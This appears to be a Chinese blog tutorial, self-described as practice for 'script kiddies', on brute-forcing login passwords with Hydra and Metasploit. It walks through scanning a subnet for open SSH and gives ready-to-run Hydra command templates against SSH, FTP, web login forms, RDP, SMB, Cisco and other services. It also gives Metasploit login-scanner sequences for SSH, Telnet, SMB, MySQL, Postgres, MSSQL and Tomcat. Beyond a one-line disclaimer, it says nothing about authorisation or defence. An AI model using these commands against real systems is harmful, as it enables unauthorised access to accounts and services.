---
layout: post
title: '暴力密码破解工具-Hydra'
date: 2020-01-05
author: shook
color: rgb(255,210,32)
cover: '../assets/images/Hydra/cover_1.jpg'
tags: KaLi
---

[0.0]: > Transform your plain text into static websites and blogs.

# 暴力密码破解工具-Hydra

<!-- wp:paragraph -->
<p>脚本小子练习的工具(一) ---------Hydra 、Metasploit<br>仅供技术调试参考</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>一、Hydra简单介绍</h4>
<!-- /wp:heading -->

<!-- wp:image {"id":384,"align":"right"} -->
<div class="wp-block-image"><figure class="alignright"><img src="http://www.shookm.com/wp-content/uploads/2020/01/img_a13854c6f5d2cfa2dd1d3aea20432f26.png" alt="" class="wp-image-384"/><figcaption>九头蛇- Hydra </figcaption></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p> Hydra是著名hack组织thc开发的一款开源的暴力密码破解工具 ， <br>，可以在线破解多种密码 。<br>Hydra支持AFP、Cisco AAA、Cisco auth、Cisco enable、CVS、Firebird、FTP、uHTTP-FORM-GET、HTTP-FORM- POST、HTTP-GET、HTTP-HEAD、HTTP-PROXY、HTTPS-FORM-GET、HTTPS-FORM-POST、HTTPS-GET、HTTPS-HEAD、HTTP-Proxy、ICQ、IMAP、IRC、LDAP、MS-SQL、MySQL、NCP、NNTP、Oracle Listener、Oracle SID、Oracle、PC-Anywhere、PCNFS、POP3、POSTGRES、RDP、Rexec、Rlogin、Rsh、SAP/R3、SIP、SMB、SMTP、SMTP Enum、SNMP、SOCKS5、SSH（v1和v2）、Subversion、Teamspeak（TS2）、Telnet、VMware-Auth、VNC、XMPP等类型密码的破解 。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><br>github：https://github.com/vanhauser-thc/thc-hydra</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4><strong>二、</strong>Hydra<strong>安装</strong></h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>暂略，以后安装补全<br>本文使用Kali内置Hydra。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>三、 本机SSH服务开启前基础配置 (可略)</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>1.1 修改配置文件</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>如下图示：打开root/etc/ssh/sshd_config 目录下文件<br>把# Port 22 修改为 Port 22  ，开启22号端口 <br>把# ListenAddress 0.0.0.0 修改为 ListenAddress 0.0.0.0  ，允许所有IP地址访问22号端口 <br>把# PermitRootLogin yes  修改为 PermitRootLogin yes    ，开通root用户登录权限，即root用户可以通过SSH远程登录Kali <br>把# PasswordAuthentication yes 修改为 PasswordAuthentication yes   ，开通密码验证服务，使用SSH远程登录Kali时需要root用户的密码 </p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":385} -->
<figure class="wp-block-image"><img src="http://www.shookm.com/wp-content/uploads/2020/01/image-1024x653.png" alt="" class="wp-image-385"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>1.2 在Kali界面开启SSH 服务，然后将Kali放到后台运行</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>在Kali命令后窗口输入 ：service ssh start , 开启SSH远程登录服务</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>在Kali命令后窗口输入 ：service ssh status , 查看SSH服务状态 ，如图示：running</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>在Kali命令后窗口输入 ：service ssh stop &nbsp;,关闭SSH服务</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>在Kali命令后窗口输入： service ssh restart ，重启SSH服务</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>在Kali命令后窗口输入：&nbsp;update-rc.d SSH enable &nbsp;，开机自启SSH服务</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>在Kali命令后窗口输入： update-rc.d SSH disabled   ，关闭SSH服务开机自启</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":386} -->
<figure class="wp-block-image"><img src="http://www.shookm.com/wp-content/uploads/2020/01/image-1-1024x510.png" alt="" class="wp-image-386"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p> 1.3 使用putty等ssh连接软件登录Kali并进行管理操作 </p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>先查询一下本机ip<br><br></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":387} -->
<figure class="wp-block-image"><img src="http://www.shookm.com/wp-content/uploads/2020/01/image-2-1024x510.png" alt="" class="wp-image-387"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>使用putty连接</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":388} -->
<figure class="wp-block-image"><img src="http://www.shookm.com/wp-content/uploads/2020/01/image-3.png" alt="" class="wp-image-388"/><figcaption><br></figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>连接成功</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":389} -->
<figure class="wp-block-image"><img src="http://www.shookm.com/wp-content/uploads/2020/01/image-4.png" alt="" class="wp-image-389"/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":4} -->
<h4>四、暴力破解（以SSH破解为例）</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>1、扫描哪些设备开启ssh服务</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>使用kali自带的namp扫描网段</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>nmap -p 22 --script=banner 192.168.2.0/24</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":391} -->
<figure class="wp-block-image"><img src="http://www.shookm.com/wp-content/uploads/2020/01/image-6-1024x510.png" alt="" class="wp-image-391"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>我们这里可以看到192.168.2.45的ssh端口（22）已经开放</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>接下来我们将使用本文主角Hydra"九头蛇"来暴力破解目标机器</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>我们现在命令行输入hydra -h来查看 Hydra的帮助信息 <br><br>   参数：<br>     -R 继续从上一次进度接着破解<br>     -S 大写，采用SSL链接<br>     -s 小写，可通过这个参数指定非默认端口<br>     -l 指定破解的用户，对特定用户破解<br>     -L 指定用户名字典<br>     -p 小写，指定密码破解，少用，一般是采用密码字典<br>     -P 大写，指定密码字典<br>     -e 可选选项，n：空密码试探，s：使用指定用户和密码试探<br>     -C 使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数<br>     -M 指定目标列表文件一行一条<br>     -o 指定结果输出文件<br>     -f 在使用-M参数以后，找到第一对登录名或者密码的时候中止破解<br>     -t 同时运行的线程数，默认为16<br>     -w 设置最大超时的时间，单位秒，默认是30s<br>     -v /-V显示详细过程</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>各协议的具体命令：<br>
    格式+示例：</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>(1)、破解ssh：
hydra -L 用户名字典 -p 密码字典 -t 线程 -vV -e ns ip ssh
hydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV ip ssh

(2)、破解ftp：
hydra ip ftp -L 用户名字典 -P 密码字典 -t 线程(默认16) -vV
hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV

(3)、get方式提交，破解web登录：
hydra -L 用户名字典 -p 密码字典 -t 线程 -vV -e ns ip http-get/admin/
hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get/admin/index.PHP

(4)、post方式提交，破解web登录：
hydra --L 用户名字典 -P 密码字典 -s 80 ip http-post-form"/admin/login.php:username=^USER^&amp;password=^PASS^&amp;submit=login:sorrypassword"
hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form"login.php:id=^USER^&amp;passwd=^PASS^:&lt;title>wrong username orpassword&lt;/title>"
参数说明：
-t同时线程数3，-l用户名是admin，字典pass.txt，保存为out.txt，-f 当破解了一个密码就停止， 
10.36.16.18目标ip，http-post-form表示破解是采用http的post方式提交的表单密码破解,&lt;title>中的内容是表示错误猜解的返回信息提示

(5)、破解https：
hydra -m /index.php -l muts -P pass.txt 10.36.16.18 https
(6)、破解teamspeak：
hydra -L 用户名字典 -P 密码字典 -s 端口号 -vV ip teamspeak

(7)、破解cisco：
hydra -P pass.txt 10.36.16.18 cisco
hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable

(8)、破解smb：
hydra -L 用户名字典 -P pass.txt 10.36.16.18 smb

(9)、破解pop3：
hydra -l muts -P pass.txt my.pop3.mail pop3

(10)、破解rdp：
hydra ip rdp -l administrator -P pass.txt -V

(11)、破解http-proxy：
hydra -l admin -P pass.txt http-proxy://10.36.16.18
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>了解了详细命令继续进行破解</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p> Kali中自带暴力破解字典，在/usr/share/wordlists/目录下 <br>操作命令：<br>hydra -L  /usr/share/wordlists/ssh_username.txt -P  /usr/share/wordlists/ ssh_password.txt -t 1 -vV -e ns 192.168.2.45 ssh </p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>我这里用的个人爆破字典，推荐使用自定义的爆破字典，高效</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>破解成功如下图，这里只是演示所以结果很快</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":392} -->
<figure class="wp-block-image"><img src="http://www.shookm.com/wp-content/uploads/2020/01/image-7-1024x510.png" alt="" class="wp-image-392"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>2、 使用Metasploit工具集中的小插件暴破SSH服务登录口令 </p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p> 第一步，开启Metasploit，我这里也是kali内置</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":393} -->
<figure class="wp-block-image"><img src="http://www.shookm.com/wp-content/uploads/2020/01/image-8-1024x510.png" alt="" class="wp-image-393"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>运行如图</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":394} -->
<figure class="wp-block-image"><img src="http://www.shookm.com/wp-content/uploads/2020/01/image-9-1024x510.png" alt="" class="wp-image-394"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p> 输入： search ssh ,查看与SSH相关的攻击模块 ，我们找到auxiliary/scanner/ssh/ssh_login  模块</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":395} -->
<figure class="wp-block-image"><img src="http://www.shookm.com/wp-content/uploads/2020/01/image-10-1024x510.png" alt="" class="wp-image-395"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p> 在msf命令后界面输入 ：use auxiliary/scanner/ssh/ssh_login  ，调用SSH攻击模块 </p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p> 在msf命令后界面输入 ：show options  ，查看需要我们设置的参数  ，我们需要补充四点：目标主机IP地址、用户名字典路径、密码字典路径、线程数（即每秒跑几个密码） </p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":396} -->
<figure class="wp-block-image"><img src="http://www.shookm.com/wp-content/uploads/2020/01/image-11-1024x510.png" alt="" class="wp-image-396"/></figure>
<!-- /wp:image -->


set rhosts 192.168.2.45         #修改目标ip<br>set user_file users.txt           #修改使用用户字典<br>set pass_file password.txt    #修改使用密码字典 <br>set threads 5


<!-- wp:paragraph -->
<p>然后我们使用show options来查看修改结果</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":397} -->
<figure class="wp-block-image"><img src="http://www.shookm.com/wp-content/uploads/2020/01/image-12-1024x510.png" alt="" class="wp-image-397"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>接下来进行最后结果，输入run来执行，等一会就出结果了</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":398} -->
<figure class="wp-block-image"><img src="http://www.shookm.com/wp-content/uploads/2020/01/image-13-1024x510.png" alt="" class="wp-image-398"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>这里提供Metasploit各个模块的口令猜解</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>SSH服务口令猜解：</p>
<!-- /wp:paragraph -->
<!-- wp:code -->
<pre class="wp-block-code"><code>
msf &gt; use auxiliary/scanner/ssh/ssh_login（使用ssh_login模块）
msf auxiliary(ssh_login) &gt; show options （查看选项）
msf auxiliary(ssh_login) &gt; set RHOSTS 10.107.0.99（目标）
msf auxiliary(ssh_login) &gt; set USER_FILE /root/username.txt（用户名字典，或指定用户）
msf auxiliary(ssh_login) &gt; set PASS_FILE /root/pass.txt（密码字典文件）
msf auxiliary(ssh_login) &gt; set THREADS 50（线程）
msf auxiliary(ssh_login) &gt; exploit （开始）
</code></pre>
<!-- /wp:code -->
Telnet口令猜解：
<!-- wp:code -->
<pre class="wp-block-code"><code>
msf &gt; use auxiliary/scanner/telnet/telnet_login （使用telnet_login模块）
msf auxiliary(telnet_login) &gt; show options （查看选项）
msf auxiliary(telnet_login) &gt; set RHOSTS 10.180.100.141（目标）
msf auxiliary(telnet_login) &gt; set USER_FILE /root/username.txt（用户名字典，或指定用户）
msf auxiliary(telnet_login) &gt; set PASS_FILE /root/pass.txt（密码字典文件）
msf auxiliary(telnet_login) &gt; exploit （开始）
</code></pre>
<!-- /wp:code -->
Samba口令猜解：
<!-- wp:code -->
<pre class="wp-block-code"><code>
msf &gt; use auxiliary/scanner/smb/smb_login （使用smb_login模块）
msf auxiliary(smb_login) &gt; show options （查看选项）
msf auxiliary(smb_login) &gt; set RHOSTS 10.180.100.10（目标）
msf auxiliary(ssmb_login) &gt; set USER_FILE /root/username.txt（用户名字典，或指定用户）
msf auxiliary(ssmb_login) &gt; set PASS_FILE /root/pass.txt（密码字典文件）
msf auxiliary(ssmb_login) &gt; exploit（开始）
</code></pre>
<!-- /wp:code -->
Mysql口令猜解：
<!-- wp:code -->
<pre class="wp-block-code"><code>
msf &gt; use auxiliary/scanner/mysql/mysql_login （使用mysql_login模块）
msf auxiliary(mysql_login) &gt; show options （查看选项）
msf auxiliary(mysql_login) &gt; set RHOSTS 192.168.230.176（目标）
msf auxiliary(mysql_login) &gt; set USERNAME root（用户名字典，或指定用户）
msf auxiliary(mysql_login) &gt; set PASS_FILE /root/pass.txt（密码字典文件）
msf auxiliary(mysql_login) &gt; exploit（开始）
</code></pre>
<!-- /wp:code -->
Postgresq口令猜解：
<!-- wp:code -->
<pre class="wp-block-code"><code>
msf &gt; use auxiliary/scanner/postgres/postgres_login （使用postgres_login模块）
msf auxiliary(postgres_login) &gt; show options （查看选项）
msf auxiliary(postgres_login) &gt; set RHOSTS 192.168.230.10（目标）
msf auxiliary(postgres_login) &gt; set USER_FILE /root/username.txt（用户名字典，或指定用户）
msf auxiliary(postgres_login) &gt; set PASS_FILE /root/pass.txt（密码字典文件）
msf auxiliary(postgres_login) &gt; exploit （开始）
</code></pre>
<!-- /wp:code -->
Mssql口令猜解：
<!-- wp:code -->
<pre class="wp-block-code"><code>
msf &gt; use auxiliary/scanner/mssql/mssql_login （使用mssql_login 模块）
msf auxiliary(mssql_login) &gt; show options （查看选项）
msf auxiliary(mssql_login) &gt; set RHOSTS 10.107.0.64（目标）
msf auxiliary(mssql_login) &gt; set USER_FILE /root/username.txt（用户名字典，或指定用户）
msf auxiliary(mssql_login) &gt; set PASS_FILE /root/pass.txt（密码字典文件）
msf auxiliary(mssql_login) &gt; exploit（开始）
</code></pre>
<!-- /wp:code -->
Tomcat口令猜解：
<!-- wp:code -->
<pre class="wp-block-code"><code>
msf &gt; use auxiliary/scanner/http/tomcat_mgr_login （使用tomcat_mgr_login模块）
msf auxiliary(tomcat_mgr_login) &gt; show options（查看选项）
msf auxiliary(tomcat_mgr_login) &gt; set RHOSTS 192.168.230.176（目标）
msf auxiliary(tomcat_mgr_login) &gt; set USER_FILE username.txt（用户名字典，或指定用户）
msf auxiliary(tomcat_mgr_login) &gt; set PASS_FILE /root/pass.txt（密码字典文件）
msf auxiliary(tomcat_mgr_login) > exploit（开始）
</code></pre>
<!-- /wp:code -->

以上就是Hydra、Metasploit的暴利破解过程。
